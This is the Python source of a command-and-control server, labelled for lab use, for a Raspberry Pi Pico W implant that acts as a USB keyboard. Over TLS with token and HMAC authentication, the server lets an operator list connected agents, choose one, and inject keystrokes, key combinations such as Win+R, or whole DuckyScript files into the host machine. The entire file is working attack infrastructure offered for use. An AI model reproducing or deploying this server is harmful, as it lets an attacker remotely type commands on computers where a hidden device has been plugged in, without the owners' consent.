
#!/usr/bin/env python3
"""
c2_server.py - C2 Server for HIDra (Pico W HID Agent)
Educational / lab use only.
 
Architecture:
  - Listens on TLS 1.3 (mandatory)
  - Each accepted connection spawns a handler thread
  - Operator sends keystroke payloads via an interactive CLI
    OR by piping a DuckyScript-like file (see --script)
 
Security properties:
  [SEC-1] RUNNER_TOKEN / RUNNER_HMAC_SECRET never logged to stdout.
  [SEC-3] Constant-time token comparison via hmac.compare_digest().
  [SEC-4] TLS 1.3 minimum; CA cert + server cert required.
  [OPS-1] Server honours the agent rate-limit response gracefully.
 
Usage:
  # Interactive mode
  python3 c2_server.py
 
  # Script mode
  python3 c2_server.py --script payload.duck
 
Environment variables:
  RUNNER_HOST          bind address         (default: 0.0.0.0)
  RUNNER_PORT          bind port            (default: 9000)
  RUNNER_TOKEN         auth token           (required)
  RUNNER_HMAC_SECRET   HMAC signing secret  (optional but recommended)
  RUNNER_CERT          TLS server cert PEM  (default: server.pem)
  RUNNER_KEY           TLS server key PEM   (default: server.key)
 
DuckyScript subset supported in --script mode:
  STRING <text>          type text
  ENTER                  press Enter
  GUI r                  Win+R (or any modifier combo)
  CTRL ALT DEL           Ctrl+Alt+Del
  DELAY <ms>             wait N milliseconds
  REM <anything>         comment, ignored

  God blessed U - By Lira. 
"""
 
import argparse
import hashlib
import hmac as hmac_mod
import json
import os
import socket
import ssl
import sys
import threading
import time
from datetime import datetime, timezone
from typing import Optional
 
 
# ═══════════════════════════════════════════════════════════════════
# §1  Configuration
# ═══════════════════════════════════════════════════════════════════
 
class Config:
    HOST        = os.environ.get("RUNNER_HOST",        "0.0.0.0")
    PORT        = int(os.environ.get("RUNNER_PORT",    "9000"))
    TOKEN       = os.environ.get("RUNNER_TOKEN",       "")
    HMAC_SECRET = os.environ.get("RUNNER_HMAC_SECRET", "")
    CERT        = os.environ.get("RUNNER_CERT",        "server.pem")
    KEY         = os.environ.get("RUNNER_KEY",         "server.key")
 
 
# ═══════════════════════════════════════════════════════════════════
# §2  Logging
# ═══════════════════════════════════════════════════════════════════
 
_log_lock = threading.Lock()
 
def log(level: str, msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
    with _log_lock:
        print(f"{ts} [{level}] {msg}", flush=True)
 
def info(m: str) -> None: log("INFO", m)
def warn(m: str) -> None: log("WARN", m)
def crit(m: str) -> None: log("CRIT", m)
 
 
# ═══════════════════════════════════════════════════════════════════
# §3  Crypto
# ═══════════════════════════════════════════════════════════════════
 
def hmac_sign(secret: str, msg: str) -> str:
    return hmac_mod.new(
        secret.encode(), msg.encode(), hashlib.sha256
    ).hexdigest()
 
def ct_equal(a: str, b: str) -> bool:
    """[SEC-3] Constant-time string comparison."""
    return hmac_mod.compare_digest(a, b)
 
 
# ═══════════════════════════════════════════════════════════════════
# §4  Protocol helpers
# ═══════════════════════════════════════════════════════════════════
 
class Proto:
    """Wraps a TLS socket with JSON-envelope send/recv."""
 
    def __init__(self, conn: ssl.SSLSocket) -> None:
        self._conn    = conn
        self._rbuf    = b""
        self._MAX     = 64 * 1024
 
    def send(self, payload: dict) -> None:
        body = json.dumps(payload, separators=(',', ':'))
        sig  = hmac_sign(Config.HMAC_SECRET, body) if Config.HMAC_SECRET else ""
        env  = json.dumps({"body": body, "sig": sig}, separators=(',', ':'))
        self._conn.sendall((env + "\n").encode())
 
    def recv(self) -> Optional[dict]:
        """Return next parsed message or None on EOF/error/HMAC fail."""
        while b"\n" not in self._rbuf:
            if len(self._rbuf) >= self._MAX:
                warn("recv buffer overflow - dropping connection")
                return None
            try:
                chunk = self._conn.recv(4096)
            except (OSError, ssl.SSLError):
                return None
            if not chunk:
                return None
            self._rbuf += chunk
 
        line, self._rbuf = self._rbuf.split(b"\n", 1)
        line = line.rstrip(b"\r")
 
        try:
            env  = json.loads(line)
            body = env["body"]
            sig  = env.get("sig", "")
        except (json.JSONDecodeError, KeyError):
            warn("malformed envelope")
            return {"action": "invalid", "error": "malformed envelope"}
 
        # [SEC-3] HMAC verification
        if Config.HMAC_SECRET:
            expected = hmac_sign(Config.HMAC_SECRET, body)
            if not ct_equal(expected, sig):
                warn("HMAC mismatch - possible tampering")
                return {"action": "invalid", "error": "hmac mismatch"}
 
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            return {"action": "invalid", "error": "malformed body"}
 
 
# ═══════════════════════════════════════════════════════════════════
# §5  Payload builder helpers
# ═══════════════════════════════════════════════════════════════════
 
def make_type(text: str) -> dict:
    return {"action": "type", "text": text}
 
def make_key(combo: str) -> dict:
    return {"action": "key", "keys": combo}
 
def make_delay(ms: int) -> dict:
    return {"action": "delay", "text": str(ms)}
 
 
# ═══════════════════════════════════════════════════════════════════
# §6  DuckyScript parser
# ═══════════════════════════════════════════════════════════════════
 
_SPECIAL_KEYS = {
    "ENTER", "ESC", "TAB", "SPACE", "DEL", "BACKSPACE",
    "HOME",  "END",  "PGUP", "PGDN",
    "UP", "DOWN", "LEFT", "RIGHT",
    "F1","F2","F3","F4","F5","F6",
    "F7","F8","F9","F10","F11","F12",
    "WIN", "GUI", "CTRL", "CONTROL", "SHIFT", "ALT",
}
 
def parse_ducky(script: str) -> list:
    payloads = []
    for raw_line in script.splitlines():
        line = raw_line.strip()
        if not line or line.upper().startswith("REM"):
            continue
 
        upper = line.upper()
 
        if upper.startswith("STRING "):
            payloads.append(make_type(line[7:]))
            continue
 
        if upper.startswith("DELAY "):
            try:
                ms = int(line[6:].strip())
                payloads.append(make_delay(ms))
            except ValueError:
                warn(f"invalid DELAY value: {line}")
            continue
 
        tokens = line.upper().split()
        if all(t in _SPECIAL_KEYS or len(t) == 1 for t in tokens):
            payloads.append(make_key(line.upper()))
        else:
            warn(f"unrecognised ducky line (skipped): {line!r}")
 
    return payloads
 
 
# ═══════════════════════════════════════════════════════════════════
# §7  Session handler
# ═══════════════════════════════════════════════════════════════════
 
_session_registry: dict = {}
 
def handle_session(raw_conn: ssl.SSLSocket, addr: tuple,
                   script_payloads) -> None:
    info(f"new connection from {addr[0]}:{addr[1]}")
    proto = Proto(raw_conn)
 
    # Wait for agent auth message
    msg = proto.recv()
    if not msg:
        info(f"{addr[0]} - connection closed before auth")
        return
 
    if msg.get("action") == "invalid":
        warn(f"{addr[0]} - invalid envelope during auth: {msg.get('error')}")
        return
 
    # [SEC-3] Constant-time token comparison
    if not Config.TOKEN:
        crit("RUNNER_TOKEN not configured")
        proto.send({"ok": False, "error": "server misconfigured"})
        return
 
    token = msg.get("token", "")
    if not ct_equal(token, Config.TOKEN):
        proto.send({"ok": False, "error": "authentication failed"})
        warn(f"{addr[0]} - auth failed")
        return
 
    proto.send({"ok": True, "action": "ok", "message": "authenticated"})
    info(f"{addr[0]} - authenticated")
 
    # Script mode: send pre-built payloads and disconnect
    if script_payloads is not None:
        for payload in script_payloads:
            proto.send(payload)
            resp = proto.recv()
            if not resp:
                warn(f"{addr[0]} - lost connection during script")
                return
            if not resp.get("ok"):
                warn(f"{addr[0]} - payload rejected: {resp.get('error')}")
            time.sleep(0.05)
 
        proto.send({"action": "exit"})
        info(f"{addr[0]} - script complete, disconnected")
        return
 
    # Interactive mode
    session = {"alive": True}
    _session_registry[addr] = (proto, session)
 
    info(f"{addr[0]} - session ready (interactive)")
    try:
        while session["alive"]:
            time.sleep(10)
            proto.send({"action": "ping"})
            resp = proto.recv()
            if not resp:
                break
    finally:
        _session_registry.pop(addr, None)
        info(f"{addr[0]} - session ended")
 
 
# ═══════════════════════════════════════════════════════════════════
# §8  Interactive CLI
# ═══════════════════════════════════════════════════════════════════
 
def cli_loop() -> None:
    """
    Operator CLI commands:
 
      list                  list connected agents
      use <index>           select active agent
      type <text>           inject text
      key <combo>           inject key combo (e.g. WIN r)
      delay <ms>            sleep on the agent
      ping                  send a ping
      script <file>         run a DuckyScript file
      exit                  send exit to agent
      terminate             send terminate (agent reboots)
      quit / q              shut down the server
    """
    active_addr = None
 
    def get_proto():
        if active_addr is None:
            print("  [!] no agent selected - use 'list' then 'use <n>'")
            return None
        entry = _session_registry.get(active_addr)
        if not entry:
            print("  [!] agent disconnected")
            return None
        return entry[0]
 
    print("\n  HIDra C2 - interactive console")
    print("  type 'help' for command list\n")
 
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] shutting down...")
            os._exit(0)
 
        if not line:
            continue
 
        parts = line.split(" ", 1)
        cmd   = parts[0].lower()
        arg   = parts[1] if len(parts) > 1 else ""
 
        if cmd in ("quit", "q", "exit_server"):
            print("[*] shutting down...")
            os._exit(0)
 
        elif cmd == "help":
            print(cli_loop.__doc__)
 
        elif cmd == "list":
            if not _session_registry:
                print("  (no agents connected)")
            else:
                for i, addr in enumerate(_session_registry):
                    marker = ">" if addr == active_addr else " "
                    print(f"  {marker} [{i}]  {addr[0]}:{addr[1]}")
 
        elif cmd == "use":
            addrs = list(_session_registry.keys())
            try:
                idx = int(arg)
                active_addr = addrs[idx]
                print(f"  [+] using agent {active_addr[0]}:{active_addr[1]}")
            except (ValueError, IndexError):
                print("  [!] invalid index")
 
        elif cmd == "type":
            p = get_proto()
            if p:
                p.send(make_type(arg))
                info(f"type: {arg!r}")
 
        elif cmd == "key":
            p = get_proto()
            if p:
                p.send(make_key(arg.upper()))
                info(f"key: {arg.upper()!r}")
 
        elif cmd == "delay":
            p = get_proto()
            if p:
                try:
                    p.send(make_delay(int(arg)))
                except ValueError:
                    print("  [!] delay requires an integer (ms)")
 
        elif cmd == "ping":
            p = get_proto()
            if p:
                p.send({"action": "ping"})
                print("  ping sent")
 
        elif cmd == "script":
            path = arg.strip()
            if not os.path.isfile(path):
                print(f"  [!] file not found: {path}")
                continue
            p = get_proto()
            if p:
                with open(path) as fh:
                    payloads = parse_ducky(fh.read())
                print(f"  [+] running {len(payloads)} steps from {path}")
                for payload in payloads:
                    p.send(payload)
                    time.sleep(0.05)
                print("  [+] script done")
 
        elif cmd == "exit":
            p = get_proto()
            if p:
                p.send({"action": "exit"})
                info("sent exit")
                active_addr = None
 
        elif cmd == "terminate":
            p = get_proto()
            if p:
                p.send({"action": "terminate"})
                info("sent terminate (agent will reboot)")
                active_addr = None
 
        else:
            print(f"  [!] unknown command: {cmd!r}  (try 'help')")
 
 
# ═══════════════════════════════════════════════════════════════════
# §9  TLS server
# ═══════════════════════════════════════════════════════════════════
 
def build_tls_context() -> ssl.SSLContext:
    """[SEC-4] TLS 1.3 only."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
 
    try:
        ctx.load_cert_chain(certfile=Config.CERT, keyfile=Config.KEY)
    except FileNotFoundError as exc:
        crit(f"TLS cert/key not found: {exc}")
        crit("Run gen_certs.sh to create a self-signed CA and server cert")
        sys.exit(1)
 
    return ctx
 
 
def serve(script_payloads) -> None:
    tls_ctx = build_tls_context()
 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_srv:
        raw_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_srv.bind((Config.HOST, Config.PORT))
        raw_srv.listen(8)
        info(f"listening on {Config.HOST}:{Config.PORT} (TLS 1.3)")
 
        while True:
            try:
                raw_conn, addr = raw_srv.accept()
            except KeyboardInterrupt:
                break
 
            try:
                tls_conn = tls_ctx.wrap_socket(raw_conn, server_side=True)
            except ssl.SSLError as exc:
                warn(f"TLS handshake failed from {addr[0]}: {exc}")
                raw_conn.close()
                continue
 
            t = threading.Thread(
                target=handle_session,
                args=(tls_conn, addr, script_payloads),
                daemon=True,
            )
            t.start()
 
 
# ═══════════════════════════════════════════════════════════════════
# §10  Entry point
# ═══════════════════════════════════════════════════════════════════
 
def main() -> None:
    parser = argparse.ArgumentParser(description="HIDra C2 Server")
    parser.add_argument(
        "--script", metavar="FILE",
        help="DuckyScript file to run on the first connecting agent, then exit"
    )
    args = parser.parse_args()
 
    if not Config.TOKEN:
        crit("RUNNER_TOKEN not set - refusing to start")
        sys.exit(1)
    if not Config.HMAC_SECRET:
        warn("RUNNER_HMAC_SECRET not set - message integrity disabled")
 
    script_payloads = None
    if args.script:
        with open(args.script) as fh:
            script_payloads = parse_ducky(fh.read())
        info(f"script loaded: {len(script_payloads)} payloads from {args.script}")
 
    server_thread = threading.Thread(
        target=serve, args=(script_payloads,), daemon=True
    )
    server_thread.start()
 
    if script_payloads is None:
        cli_loop()
    else:
        server_thread.join()
 
 
if __name__ == "__main__":
    main()
 